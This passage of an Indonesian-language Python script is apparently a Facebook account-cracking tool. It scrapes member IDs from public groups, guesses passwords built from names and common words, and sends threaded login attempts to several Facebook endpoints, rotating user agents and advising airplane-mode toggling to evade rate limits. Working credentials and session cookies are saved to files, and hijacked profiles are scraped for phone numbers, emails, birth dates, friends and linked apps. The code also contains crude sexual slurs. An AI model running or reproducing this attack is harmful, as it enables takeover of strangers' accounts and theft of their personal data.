			sol().print(lo, style='cyan')
			exit()
	tot = '# BERHASIL DUMP %s ID '%(len(id))
	if len(id)==0:
		tot2 = mark(tot, style='red')
	else:
		tot2 = mark(tot, style='cyan')
	sol().print(tot2)
	setting()

def setting():
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[m[01] \33[1;32mAKUN TERTUA"""%(h))
	print("""%s \33[m[02] \33[1;32mAKUN TERMUDA """%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	hu = input(x+'\33[m[ ? ] \33[1;96mInput Number: ')
	if hu in ['1','01']:
		for bacot in id:
			id2.append(bacot)
	elif hu in ['2','02']:
		for bacot in id:
			id2.insert(0,bacot)
	
	else:
		print("""%s \33[1;33mPilihan Tidak Ada Di Menu"""%(h))
		exit()
		
		
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	print("""%s \33[1;32m[01] B-API """%(h))
	print("""%s \33[1;32m[02] MOBILE"""%(h))
	print("""%s \33[1;32m[03] MBASIC """%(h))
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	hc = input(x+'\33[m[ ? ] \33[1;96m•Input Number>  ')
	if hc in ['1','01']:
		method.append('crack2')
	elif hc in ['2','02']:
		method.append('crack')
	elif hc in ['3','03']:
		method.append('crack3')
	print("""%s ════════════════════════════════════════════════════════ """%(h))
	aplik = input(x+'\33[m[ ? ] \33[1;32m•Tampilkan Aplikasi Terkait ? (y/t):  ')
	if aplikasi in ['y','Y']:
		taplikasi.append('ya')
	else:
		taplikasi.append('no')
	osk = input(x+'\33[m[ ? ] \33[1;33m•Tampilkan Opsi Cekpoint ? (y/t):  ')
	if osk in ['y','Y']:
		oprek.append('ya')
	else:
		oprek.append('no')
	passwrd()

def passwrd():
	clear()
	banner()
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	print("""%s\33[m•Hasil OK  Disimpan Ke : OK/%s\n\33[m•Hasil CP Disimpan Ke : CP/%s\n\33[m•TRUN ON/OF MODE PESAWAT SETIAP 500 Id\n\33[1;33m•SAMBIL NUNGGU PROSES CRACK\n\33[1;33m•DI SARANKAN COLI OM"""%(h,okc,cpc))
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['sayangku','sayang123','william gz','bismillah','anjing','katasandi','sandi123','bismillah','pasword','memek','kontol','kangcoli']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'api' in method:
				pool.submit(crack2,idf,pwv)
			elif 'free' in method:
				pool.submit(crack3,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	print('')
	print("""%s ●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●●● """%(h))
	woi = input(x+'\33[1;96m•Ingin Menampilkan Opsi Hasil Crack? (y/t) : ')
	if woi in ['y','Y']:
		cek_opsi()
	else:
		exit()

def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [kang coli] %s/%s ~_~ [OK:%s] ^_^ [CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":'m.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'m.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					print(f"\33[1;33m╚══[CP AMIR]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					print(f"\33[1;32m╚══[OK AMIR]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
				elif 'ya' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki,headers=headapp).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki,headers=headapp).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki,headers=headapp).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki,headers=headapp).text
					responscee4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki,headers=headapp).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					print(f"\33[1;32m╚══[OK AMIR]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					cek_apk(kuki)
					break


			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack2(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [AMIR] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen).replace('\n','')
	ses = requests.Session()
	for pw in pwv:
		try:
			head = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
			if "www.facebook.com" in resp.json()["error_msg"]:
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\r%s++++ %s|%s ----> CP       '%(b,idf,pw))
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "session_key" in resp.text and "EAAB" in resp.text:
				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
				ok+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack3(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [BarusV2] %s/%s ~_~ [OK:%s | CP:%s] ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			tix = time.time()
			ses.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
			dataa ={
'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
'm_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
'email':idf,
'pass':pw
}
			ses.headers.update({'Host': 'mbasic.facebook.com',
'cache-control': 'max-age=0',
'upgrade-insecure-requests': '1',
'origin': 'https://mbasic.facebook.com',
'content-type': 'application/x-www-form-urlencoded',
'user-agent': ua,
'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-user': 'empty',
'sec-fetch-dest': 'document',
'referer': 'https://mbasic.facebook.com/login/?email='+idf,
'accept-encoding':'gzip, deflate br',
'accept-language':'en-GB,en-US;q=0.9,en;q=0.8'})

			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					akun.append(idf+'|'+pw)
					ceker(idf,pw)
				else:
					print('\n')
					print(f"\33[1;33m╚══[CP AMIR]\33[1;33m{idf}\33[m•\33[1;33m{pw}\n")
					open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
					akun.append(idf+'|'+pw)
					cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				if 'no'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					print('\n')
					print(f"\33[1;32m╚══[OK AMIR]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					break
				elif 'ya'in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					get_id = session.get("https://m.facebook.com/profile.php",cookies=coki).text
					nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
					response = session.get("https://m.facebook.com/profile.php?v=info",cookies=coki).text
					response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=coki).text
					response3 = session.get(f"https://m.facebook.com/{user}/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_",cookies=coki).text
					response4 = session.get(f"https://m.facebook.com/timeline/app_collection/?collection_token={user}%3A184985071538002%3A32&_rdc=1&_rdr",cookies=coki).text
					try:nomer = re.findall('\<a\ href\=\"tel\:\+.*?\">\<span\ dir\=\"ltr\">(.*?)<\/span><\/a>',str(response))[0]
					except:nomer = ""
					try:email = re.findall('\<a href\=\"https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?\" target\=\".*?\"\>(.*?)<\/a\>',str(response))[0].replace('&#064;','@')
					except:email=""
					try:ttl = re.findall('\<\/td\>\<td\ valign\=\"top\" class\=\".*?\"\>\<div\ class\=\".*?\"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>',str(response))[0]
					except:ttl=""
					try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
					except:teman = ""
					try:pengikut = re.findall('\<span\ class\=\".*?\"\>(.*?)\<\/span\>',str(response4))[1]
					except:pengikut = ""
					try:
						tahun = ""
						cek_thn = re.findall('\<div\ class\=\".*?\" id\=\"year_(.*?)\">',str(response3))
						for nenen in cek_thn:
							tahun += nenen+", "
					except:pass

					hit1, hit2 = 0,0
					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
						infoakun += (f"Aplikasi Yang Terkait*\n")
						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
							infoakun += (f"Tidak Ada Aplikasi Aktif Yang Terkait *\n")
						else:
							infoakun += (f"	Aplikasi Aktif : \n")
							apkAktif = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek))
							ditambahkan = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek))
							for muncul in apkAktif:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {ditambahkan[hit2]}\n")
								hit2+=1
						if "Anda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau" in cek2:
							infoakun += (f"\nTidak Ada Aplikasi Kedaluwarsa Yang Terkait\n")
						else:
							hit1,hit2=0,0
							infoakun += (f"	Aplikasi Kedaluwarsa :\n")
							apkKadaluarsa = re.findall('\/><div\ class\=\".*?\"\>\<span\ class\=\".*?\"\>(.*?)<\/span\>',str(cek2))
							kadaluarsa = re.findall('\<div\>\<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>',str(cek2))
							for muncul in apkKadaluarsa:
								hit1+=1
								infoakun += (f"		[{hit1}] {muncul} {kadaluarsa[hit2]}\n")
								hit2+=1
					else:pass
					print('\n')
					print(f"\33[1;32m╚══[OK BARUS]\33[1;96m{idf}\33[m•\33[1;96m{pw}\n")
					cek_apk(kuki)
					break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def ceker(idf,pw):
	global cp
	ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36'
	head = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
	ses = requests.Session()
	try:
		hi = ses.get('https://mbasic.facebook.com')
		ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':idf,'pass':pw,'login':'submit'}, headers=head, allow_redirects=True).text,'html.parser')
		jo = ho.find('form')
		data = {}
		lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
		for anj in jo('input'):
			if anj.get('name') in lion:
				data.update({anj.get('name'):anj.get('value')})
		kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=head).text,'html.parser')
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1
		opsi = kent.find_all('option')
		if len(opsi)==0:
			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
		else:
			for opsii in opsi:
				print('\r%s---> %s%s'%(kk,opsii.text,x))
	except Exception as c:
		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
		cp+=1

def cek_opsi():
	c = len(akun)
	hu = 'Terdapat %s Akun Untuk Dicek\nSebelum Mulai, Mode Pesawat/Ubah Kartu Sim Terlebih Dahulu'%(c)
	cetak(nel(hu, title='CEK OPSI'))
	input(x+'['+h+'•'+x+'] Mulai')
	cek = '# PROSES CEK OPSI DIMULAI'
	sol().print(mark(cek, style='green'))
	love = 0
	for kes in akun:
		try:
			try:
				id,pw = kes.split('|')[0],kes.split('|')[1]
			except IndexError:
				time.sleep(2)
				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
				continue
			bi = random.choice([u,k,kk,b,h,hh])
			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
			ua = 'Mozilla/5.0 (Linux; Android 8.1.0; S45B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
			ses = requests.Session()
			header = {"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
			hi = ses.get('https://mbasic.facebook.com')
			ho = parser(ses.post('https://mbasic.facebook.com/login.php', data={'email':id,'pass':pw,'login':'submit'}, headers=header, allow_redirects=True).text,'html.parser')
			if "checkpoint" in ses.cookies.get_dict().keys():
				try:
					jo = ho.find('form')
					data = {}
					lion = ['nh','jazoest','fb_dtsg','submit[Continue]','checkpoint_data']
					for anj in jo('input'):
						if anj.get('name') in lion:
							data.update({anj.get('name'):anj.get('value')})
					kent = parser(ses.post('https://mbasic.facebook.com'+str(jo['action']), data=data, headers=header).text,'html.parser')
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					opsi = kent.find_all('option')
					if len(opsi)==0:
						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
					else:
						for opsii in opsi:
							print('\r%s---> %s%s'%(kk,opsii.text,x))
				except:
					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
			elif "c_user" in ses.cookies.get_dict().keys():
				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
			else:
				print('\r%s++++ %s|%s ----> SALAH       %s'%(x,id,pw,x))
			love+=1
		except requests.exceptions.ConnectionError:
			print('')
			li = '# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGI'
			sol().print(mark(li, style='red'))
			exit()
	dah = '# DONE'
	sol().print(mark(dah, style='green'))
	exit()

def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def lah():
	print("\r"+balmond+m+" Total ID : "+str(len(id))+"                     ")
	input(balmond+m +" Mode Pesawat 5 Detik Dan Tekan Enter Untuk Mulai Crack ")
	pass
	setting()
	
def grup():
	win = '# PASTIKAN ID GROUP PUBLIK'
	win2 = mark(win, style='cyan')
	sol().print(win2)
	id = input(""+balmond+h+" \33[1;96mId Atau User Name Grup : ")
	ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
	miskinlu = {"user-agent": ua}
	url = "https://mbasic.facebook.com/groups/"+id
	ses = requests.Session()
	try:
		gn = parser(ses.get(url, headers=miskinlu).text, "html.parser")
	except requests.exceptions.ConnectionError:
		print(balmond+m+" \33[1;33mKoneksi Internet Terputus..")
		time.sleep(0.5)
		exit()
	berr = gn.find("title")
	berr2 = berr.text.replace(" | Facebook","").replace(" Grup Publik","")
	if berr2=='Masuk Facebook':
		print(balmond+m+" Limit, Silahkan Mode Pesawat Dan Coba Lagi..")
		time.sleep(0.5)
		exit()
	elif berr2=='Kesalahan':
		jalan(balmond+m+" \33[1;33mGrup Tidak Ditemukan..")
		time.sleep(0.5)
		exit()
	else:pass
	print(""+balmond+p+" \33[1;32mNama Grup : "+berr2)
	ggs = gn.find_all('table')
	ang = []
	for ff in ggs:
		anggo = ff.text
		bro = anggo.replace('Anggota','')
		try:
			mex = int(bro)
			jumlah = ang.append(mex)
		except:
			pass
	if len(ang)==0:
		print(balmond+h+" Anggota : -")
	else:
		print(balmond+h+" Anggota : "+str(ang[0]))
	grup1(url)

def grup1(urls):
	use = []
	ses = requests.Session()
	print(""+balmond+m+" \33[1;32mJika Stack, Mode Pesawat 5 Detik")
	print(balmond+m+" \33[1;32mSedang Mengumpulkan ID")
	print(balmond+m+" \33[1;32mTekan CTRL + C Untuk Stop")
	while True:
		try:
			ua = 'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'
			miskinlu = {"user-agent": ua}
			try:
				url = use[0]
			except:
				url = urls
			set = parser(ses.get(url, headers=miskinlu).text, "html.parser")
			bf2 = set.find_all('a')
			for g in bf2:
				css = str(g).split('>')
				if 'Lihat Postingan Lainnya</span' in css:
					bcj = str(g).replace('<a href="','').replace('amp;','')
					bcj2 = bcj.split(' ')[0].replace('"><img','')
			tes = set.find_all('table')
			for cari in tes:
				liatnih = cari.text
				spl = liatnih.split(' ')
				if 'mengajukan' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.replace(' mengajukan pertanyaan .','')
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+k+"Proses Mengambil ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				elif '>' in spl:
					idsiapa = re.findall('content_owner_id_new.\w+',str(cari))
					idyou =	idsiapa[0].replace('content_owner_id_new.','')
					namayou = liatnih.split(' > ')[0]
					idku = idyou+'|'+namayou
					if idku in id:
						continue
					else:
						id.append(idku)
						print(("\r"+balmond+h+" { "+O+"Mengumpulkan ID "+str(len(id))+h+" }"), end="");sys.stdout.flush()
				else:
					continue
			try:
				link_ = bcj2
				use.insert(0,'https://mbasic.facebook.com'+link_)
			except:
				girang = set.find('title')
				girang2 = girang.text.replace(" | Facebook","").replace(" Grup Publik","")
				if girang2=='Masuk Facebook':
					pass
				else:
					lah()
		except requests.exceptions.ConnectionError:
			try:
				time.sleep(31)
			except KeyboardInterrupt:
				lah()
		except KeyboardInterrupt:
			lah()
			
	
# CEK APLIKASI 
def cek_apk(kuki):
	session = requests.Session()
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n  %s%s. %s%s"%(P,i+1,H,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))
	w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kuki}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\n   %s%s. %s%s"%(P,i+1,M,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\n%s• cookie invalid"%(M))

if __name__=='__main__':
	os.system('git pull')
	try:os.mkdir('CP')
